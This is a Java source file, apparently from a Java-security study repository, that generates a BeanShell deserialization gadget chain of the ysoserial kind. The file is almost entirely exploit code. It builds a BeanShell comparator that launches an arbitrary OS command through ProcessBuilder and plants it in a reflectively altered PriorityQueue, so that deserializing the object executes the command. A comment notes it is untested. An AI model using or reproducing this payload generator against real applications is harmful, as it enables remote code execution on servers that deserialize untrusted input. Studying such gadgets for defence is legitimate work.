package com.pinger.javasec.common;

import bsh.Interpreter;
import bsh.XThis;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Modifier;
import java.lang.reflect.Proxy;
import java.util.Arrays;
import java.util.Comparator;
import java.util.PriorityQueue;
/**
 * @author : p1n93r
 * @date : 2021/7/26 23:45
 * 还未测试...
 */
public class BeanShell1 {

    public static String join(Iterable<String> strings, String sep, String prefix, String suffix) {
        final StringBuilder sb = new StringBuilder();
        boolean first = true;
        for (String s : strings) {
            if (! first) sb.append(sep);
            if (prefix != null) sb.append(prefix);
            sb.append(s);
            if (suffix != null) sb.append(suffix);
            first = false;
        }
        return sb.toString();
    }


    public static PriorityQueue getObject(String command) throws Exception {
        // BeanShell payload

        String payload =
                "compare(Object foo, Object bar) {new java.lang.ProcessBuilder(new String[]{" +
                        join( // does not support spaces in quotes
                                Arrays.asList(command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"","\\\"").split(" ")),
                                ",", "\"", "\"") +
                        "}).start();return new Integer(1);}";

        // Create Interpreter
        Interpreter i = new Interpreter();

        // Evaluate payload
        i.eval(payload);

        // Create InvocationHandler
        XThis xt = new XThis(i.getNameSpace(), i);
        Class<? extends XThis> xtClazz = xt.getClass();
        Field declaredField = xtClazz.getDeclaredField("invocationHandler");
        declaredField.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) declaredField.get(xt);

        // Create Comparator Proxy
        Comparator comparator = (Comparator) Proxy.newProxyInstance(Comparator.class.getClassLoader(), new Class<?>[]{Comparator.class}, handler);

        // Prepare Trigger Gadget (will call Comparator.compare() during deserialization)
        final PriorityQueue<Object> priorityQueue = new PriorityQueue<Object>(2, comparator);
        Object[] queue = new Object[] {1,1};
        Class<? extends PriorityQueue> queueClazz = priorityQueue.getClass();
        Field queueClazzDeclaredField = queueClazz.getDeclaredField("queue");
        queueClazzDeclaredField.setAccessible(true);
        queueClazzDeclaredField.set(priorityQueue,queue);

        Field sizeClazzDeclaredField = queueClazz.getDeclaredField("size");
        sizeClazzDeclaredField.setAccessible(true);
        sizeClazzDeclaredField.set(priorityQueue,2);

        Field serialVersionUIDField = queueClazz.getDeclaredField("serialVersionUID");
        serialVersionUIDField.setAccessible(true);
        Field modifersField = Field.class.getDeclaredField("modifiers");
        modifersField.setAccessible(true);
        // 把指定的field中的final修饰符去掉
        modifersField.setInt(serialVersionUIDField, serialVersionUIDField.getModifiers() & ~Modifier.FINAL);
        serialVersionUIDField.set(priorityQueue,-7720805057305804111L);


        return priorityQueue;
    }




}
